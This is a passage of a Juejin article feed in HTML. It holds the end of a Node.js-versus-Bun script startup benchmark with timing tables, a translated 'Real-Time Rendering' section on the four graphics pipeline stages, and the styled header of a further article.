<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>361</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">361 ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">361</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span> 左右。第二个反常 io 反而更慢。</p>
<p>整体耗时 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>337</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">337 ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">337</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>。结论 <code>bun run</code> 大概是 <code>npm run</code> 的两倍（<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>600</mn><mi mathvariant="normal">/</mi><mn>300</mn><mo>=</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">600 / 300=2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">600/300</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">2</span></span></span></span></span>）性能。</p>
<p>突然想起 Node.js v22.0.0 支持 <code>node --run</code> 运行脚本，专为性能而生，看看它表现如何。</p>
<h2 data-id="heading-11">第四轮：package.json 脚本 `--run` 直接运行</h2>
<p>先解释下 <code>node --run</code>，是的，它也可以执行 package.json 中的脚本，而且生来就是为性能考虑（不会执行 <code>pre</code> / <code>post</code> 钩子）。</p>
<blockquote>
<p>它将从 <code>package.json</code> 文件的 <code>"scripts"</code> 对象中运行指定的命令。如果提供的 <code>"command"</code> 不存在，则会列出可用的脚本。</p>
<p><code>node --run</code> 并不旨在完全匹配 <code>npm run</code> 或其他包管理器的运行命令的行为。Node.js 的实现<strong>有意更加精简</strong>，以便在最常见的用例中<strong>专注于顶级性能</strong>。其他运行实现中一些被有意排除的功能包括：</p>
<ul>
<li>除了运行指定的脚本外，还会运行前置（<code>pre</code>）或后置（<code>post</code>）脚本。</li>
<li>定义特定于包管理器的环境变量。</li>
</ul>
<p>—— <a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2Fdocs%2Flatest%2Fapi%2Fcli.html%23--run" target="_blank" title="https://nodejs.org/docs/latest/api/cli.html#--run" ref="nofollow noopener noreferrer">nodejs.org/docs/latest…</a></p>
</blockquote>
<h3 data-id="heading-12">node --run</h3>
<p><code>❯ time node --run io</code>:</p>
<pre><code class="hljs language-ts" lang="ts">node --run io  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">79</span>% cpu <span class="hljs-number">0.216</span> total
node --run io  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>16s system <span class="hljs-number">81</span>% cpu <span class="hljs-number">0.192</span> total
node --run io  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>19s system <span class="hljs-number">84</span>% cpu <span class="hljs-number">0.220</span> total
</code></pre>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>216</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">216ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">216</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span> 完美 🤩</p>
<p><code>❯ time node --run empty</code>:</p>
<pre><code class="hljs language-ts" lang="ts">node --run empty  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">89</span>% cpu <span class="hljs-number">0.192</span> total
node --run empty  <span class="hljs-number">0.</span>01s user <span class="hljs-number">0.</span>16s system <span class="hljs-number">80</span>% cpu <span class="hljs-number">0.212</span> total
node --run empty  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">89</span>% cpu <span class="hljs-number">0.192</span> total
</code></pre>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>192</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">192 ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">192</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span> 完美 🤩🤩</p>
<p><code>node --run</code> 整体平均：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>204</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">204 ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">204</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>，确实做了性能优化，<strong>三倍性能提升 🚀</strong>：<code>npm run 616ms</code> VS <code>node --run 204ms</code></p>
<h3 data-id="heading-13">bun --run</h3>
<pre><code class="hljs language-ts" lang="ts">bun --run empty  <span class="hljs-number">0.</span>06s user <span class="hljs-number">0.</span>14s system <span class="hljs-number">53</span>% cpu <span class="hljs-number">0.370</span> total
bun --run empty  <span class="hljs-number">0.</span>05s user <span class="hljs-number">0.</span>21s system <span class="hljs-number">75</span>% cpu <span class="hljs-number">0.347</span> total
bun --run empty  <span class="hljs-number">0.</span>04s user <span class="hljs-number">0.</span>21s system <span class="hljs-number">68</span>% cpu <span class="hljs-number">0.379</span> total
</code></pre>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>370</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">370 ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">370</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span></p>
<pre><code class="hljs language-ts" lang="ts">bun --run io  <span class="hljs-number">0.</span>01s user <span class="hljs-number">0.</span>18s system <span class="hljs-number">61</span>% cpu <span class="hljs-number">0.324</span> total
bun --run io  <span class="hljs-number">0.</span>01s user <span class="hljs-number">0.</span>23s system <span class="hljs-number">73</span>% cpu <span class="hljs-number">0.334</span> total
bun --run io  <span class="hljs-number">0.</span>03s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">52</span>% cpu <span class="hljs-number">0.382</span> total
</code></pre>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>334</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">334 ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">334</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span> （io 反而速度快于空脚本 -_-||）</p>
<p><code>bun --run</code> 整体耗时 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>352</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">352 ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">352</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>，<strong>反常三：<code>bun --run</code> 慢于 <code>node --run</code></strong> 的 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>204</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">204 ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">204</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span></p>
<h2 data-id="heading-14">性能数据总结</h2>
<p>文章从三个维度（直接启动文件、运行 package.json 脚本、使用 <code>--run</code> 命令）对比了 Node.js 和 Bun 的性能。</p>
<h3 data-id="heading-15">核心结论</h3>
<ol>
<li><strong>直接启动文件</strong>：无论 TS or JS，Node.js 以显著优势胜出。</li>
<li><strong>运行 package.json 脚本</strong>：Bun (<code>bun run</code>) 击败 npm (<code>npm run</code>)，但 <code>node --run</code> 凭借其精简设计击败 <code>bun run / npm run / bun --run</code>。</li>
</ol>
<p><strong/></p><p align="center"><strong>至此本文颠覆了一个传统观念“bun 启动一定比 Node.js 更快”。</strong></p><p/>
<h4 data-id="heading-16">附录：详细数据</h4>
<h6 data-id="heading-17">表格一：直接运行 JS/TS 文件性能对比 (单位：ms)</h6>















































<table><thead><tr><th>测试场景</th><th>Node.js (v22.18.0)</th><th>Bun (v1.3.2)</th><th><strong>性能胜出方</strong></th></tr></thead><tbody><tr><td>启动空 JS 文件</td><td>~217</td><td>~371</td><td>Node.js (快 ~41%)</td></tr><tr><td>启动含 IO 的 JS 文件</td><td>~234</td><td>~351</td><td>Node.js (快 ~33%)</td></tr><tr><td><strong>JS 文件启动综合耗时</strong></td><td><strong>~225</strong></td><td>~361</td><td><strong>Node.js 胜出</strong></td></tr><tr><td>启动空 TS 文件</td><td>~240</td><td>~372</td><td>Node.js (快 ~35%)</td></tr><tr><td>启动含 IO 的 TS 文件</td><td>~255</td><td>~405</td><td>Node.js (快 ~37%)</td></tr><tr><td><strong>TS 文件启动综合耗时</strong></td><td><strong>~248</strong></td><td>~389</td><td><strong>Node.js 胜出</strong></td></tr></tbody></table>
<p><strong>结论一：</strong>  在直接启动文件（无论 JS 或 TS）的场景下，<strong>Node.js 🚀 性能显著优于 Bun</strong>，平均领先幅度在 35%-41% 左右。虽然有反直觉但是我的 Windows 下确实如此。</p>
<hr/>
<h5 data-id="heading-18">表格二：运行 package.json 脚本性能对比 (单位：ms)</h5>








































<table><thead><tr><th>执行方式</th><th>平均耗时 (含IO)</th><th>平均耗时 (空脚本)</th><th>综合平均耗时</th><th><strong>性能排序 (由快到慢)</strong></th></tr></thead><tbody><tr><td><strong><code>node --run</code></strong></td><td>~216 ms</td><td>~192 ms</td><td><strong>~204 ms</strong></td><td>🥇 <strong>第1名</strong></td></tr><tr><td><strong><code>bun run</code></strong></td><td>~313 ms</td><td>~361 ms</td><td>~337 ms</td><td>🥈 <strong>第2名</strong></td></tr><tr><td><strong><code>bun --run</code></strong></td><td>~334 ms</td><td>~370 ms</td><td>~352 ms</td><td>🥉 <strong>第3名</strong></td></tr><tr><td><strong><code>npm run</code></strong></td><td>~650 ms</td><td>~616 ms</td><td>~633 ms</td><td><strong>第4名</strong></td></tr></tbody></table>
<p><strong>结论二：</strong></p>
<ol>
<li><strong><code>node --run</code> 是绝对的性能冠军</strong>，速度是 <code>npm run</code> 的 <strong>3.1 倍</strong>，也比 <code>bun run</code> 快约 <strong>65%</strong> 。</li>
<li>Bun 相关命令性能接近：<code>bun run</code> 和 <code>bun --run</code> 性能在同一水平，都显著快于 <code>npm run</code>（快约 88%）。</li>
<li><strong><code>npm run</code> 垫底</strong>：传统 npm 脚本的启动开销最大，耗时最长。</li>
</ol>
<h2 data-id="heading-19">对我们的启发</h2>
<ul>
<li><strong>Node.js vs. Bun 启动速度</strong>：在直接启动 <code>.js</code> 或 <code>.ts</code> 文件时，Node.js 比 Bun 快约 <strong>40%-60%</strong> 。这是“<strong>一个非常重要的结论</strong>”。</li>
<li><strong>Package Script 运行速度</strong>：
<ul>
<li><code>bun run</code> 比 <code>npm run</code> 快约 <strong>2 倍</strong>。</li>
<li>而黑马 🐎 <code>node --run</code> 比 <code>npm run</code> 快约 <strong>3 倍</strong>！</li>
</ul>
</li>
</ul>
<p><strong><code>node --run</code> 的意义</strong>——<strong>包脚本运行的革新</strong>：<code>node --run</code> 无疑是本次测试的最大亮点，其速度非常接近直接运行 <code>node foo.js</code> 的速度，实现了近乎“裸奔”的脚本执行性能。它通过<strong>牺牲 npm 脚本的部分高级功能</strong>（如 <code>pre</code>/<code>post</code> 钩子、特定的环境变量），换来了  <strong>~3 倍于 <code>npm run</code> 的速度提升</strong>，甚至超越了以速度见长的 <code>bun run</code>。对于追求极致构建、测试或启动速度，且不依赖这些高级特性的项目，<code>node --run</code> 提供了一个近乎完美的“性能模式”。</p>
<p>启发：如果你要直接执行文件请使用 Node.js，如果要执行 npm script 建议 99% 情况下用 <code>node --run</code>（无需运行 <code>pre / post npm script</code> 时）否则 <code>bun run</code>。</p>
<h2 data-id="heading-20">说明</h2>
<p>测试环境 Windows 10、git bash、Node.js 🟢 v22.18.0、npm v11.7.0、bun 🍞 v1.3.2。</p>
<hr/>
<p><em/></p><p align="center"><em>—— 完 🎉 最新文章请关注公众号 <strong><code>JavaScript与编程艺术</code></strong> ——</em></p><p/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[《实时渲染》第2章-图形渲染管线-2.6管线综述]]></title>    <link>https://juejin.cn/post/7602472997920473088</link>    <guid>https://juejin.cn/post/7602472997920473088</guid>    <pubDate>2026-02-03T13:14:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602472997920473088" data-draft-id="7602472997920456704" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="《实时渲染》第2章-图形渲染管线-2.6管线综述"/> <meta itemprop="keywords" content="计算机图形学"/> <meta itemprop="datePublished" content="2026-02-03T13:14:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="charlee44"/> <meta itemprop="url" content="https://juejin.cn/user/1117549770846872"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            《实时渲染》第2章-图形渲染管线-2.6管线综述
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1117549770846872/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    charlee44
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T13:14:53.000Z" title="Tue Feb 03 2026 13:14:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0"><strong>实时渲染</strong></h2>
<h2 data-id="heading-1">2. 图形渲染管线</h2>
<h3 data-id="heading-2">2.6 管线综述</h3>
<p>点、线和三角形是构建模型或对象的渲染图元。假设该应用程序是一个交互式计算机辅助设计 (CAD) 应用程序，并且用户正在检查华夫饼制造商的设计。在这里，我们将在整个图形渲染管线中遵循这个模型，包括四个主要阶段：应用程序、几何、光栅化和像素处理。场景以透视图渲染到屏幕上的窗口中。在这个简单的示例中，华夫饼机模型包括线条（以显示零件的边缘）和三角形（以显示表面）。华夫饼机有一个可以打开的盖子。一些三角形由带有制造商标志的二维图像构成。对于这个例子，表面着色完全在几何阶段计算，除了纹理的应用，它发生在光栅化阶段。</p>
<h4 data-id="heading-3">2.6.1 应用程序阶段</h4>
<p>CAD应用程序允许用户选择和移动模型的各个部分。例如，用户可能会选择盖子，然后移动鼠标将其打开。应用阶段必须将鼠标移动转换为相应的旋转矩阵，然后确保该矩阵在渲染时正确应用于盖子。另一个示例：播放的动画沿着预定义的路径移动相机以从不同视图显示华夫饼机。然后，应用程序必须根据时间更新相机参数，例如位置和视图方向。对于要渲染的每一帧，应用程序阶段将模型的相机位置、光照和图元提供给管道中的下一个主要阶段——几何阶段。</p>
<h4 data-id="heading-4">2.6.2 几何处理</h4>
<p>对于透视视图，我们假设应用程序提供了一个投影矩阵。此外，对于每个对象，应用程序都计算了一个矩阵，该矩阵描述了视图变换以及对象本身的位置和方向。在我们的例子中，华夫饼机的底座有一个矩阵，盖子是另一个。在几何阶段，对象的顶点和法线使用该矩阵进行变换，将对象放入视图空间。然后可以使用材质和光源属性计算顶点处的着色或其他计算。然后使用单独的用户提供的投影矩阵执行投影，将对象转换为代表眼睛所见的单位立方体空间。立方体外的所有基元都将被丢弃。与这个单位立方体相交的所有图元都被裁剪在立方体上，以获得一组完全位于单位立方体内部的图元。然后将顶点映射到屏幕上的窗口中。在执行完所有这些每三角形和每顶点操作之后，结果数据将传递到光栅化阶段。</p>
<h4 data-id="heading-5">2.6.3 光栅化</h4>
<p>然后将在前一阶段裁剪后幸存下来的所有图元进行光栅化，这意味着找到图元内的所有像素并将其进一步发送到管线中进行像素处理。</p>
<h4 data-id="heading-6">2.6.4 像素处理</h4>
<p>这里的目标是计算每个可见图元的每个像素的颜色。那些与任何纹理（图像）相关联的三角形将根据需要使用这些图像进行渲染。可见性通过z缓冲区算法以及可选的丢弃和模板测试来解决。依次处理每个对象，然后将最终画面显示在屏幕上。</p>
<h4 data-id="heading-7">2.6.5 总结</h4>
<p>这条管线源于数十年针对实时渲染应用程序的API和图形硬件演变。需要注意的是，这并不是唯一可能的渲染管道；离线渲染管道经历了不同的进化路径。电影制作的渲染通常使用微多边形管道[289, 1734] 完成，但最近已经普遍开始使用光线追踪和路径追踪了。<a href="https://link.juejin.cn?target=%25E7%25AC%25AC11.2.2%25E8%258A%2582" target="_blank" title="%E7%AC%AC11.2.2%E8%8A%82" ref="nofollow noopener noreferrer">第11.2.2节</a>中介绍的这些技术也可用于架构和设计视觉化。</p>
<p>多年来，应用程序开发人员使用此处描述的过程的唯一方法是通过使用中的图形API定义的固定功能管线。固定功能管线之所以如此命名，是因为实现它的图形硬件由无法以灵活方式编程的元素组成。主要固定功能管线的机器的最后一个例子是2006年推出的任天堂Wii。另一方面，可编程GPU可以准确地确定在整个管线的各个子阶段应用哪些操作。对于本书的第四版，我们假设所有开发都是使用可编程GPU完成的。</p>
<h3 data-id="heading-8">2.7 进一步阅读和资源</h3>
<p>Blinn的书《A Trip Down the Graphics Pipeline》[165] 是一本关于从头编写软件渲染器的老书。这是一个很好的资源，可以了解实现渲染管道的一些微妙之处，解释关键算法，例如剪辑和透视插值。古老（但经常更新）的《OpenGL 编程指南》（又名“红皮书”）[885] 提供了图形管线和与其使用相关的算法的全面描述。我们这本书的网站realtimerendering.com提供了指向各种管线图、渲染引擎实现等的链接。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[代码不值钱了，什么更值钱？]]></title>    <link>https://juejin.cn/post/7602205524719452194</link>    <guid>https://juejin.cn/post/7602205524719452194</guid>    <pubDate>2026-02-03T13:13:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602205524719452194" data-draft-id="7602205524719173666" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="代码不值钱了，什么更值钱？"/> <meta itemprop="keywords" content="AI编程,Agent,VibeCoding"/> <meta itemprop="datePublished" content="2026-02-03T13:13:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AlienZHOU"/> <meta itemprop="url" content="https://juejin.cn/user/3843548380668829"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            代码不值钱了，什么更值钱？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3843548380668829/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AlienZHOU
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T13:13:37.000Z" title="Tue Feb 03 2026 13:13:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    17
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body 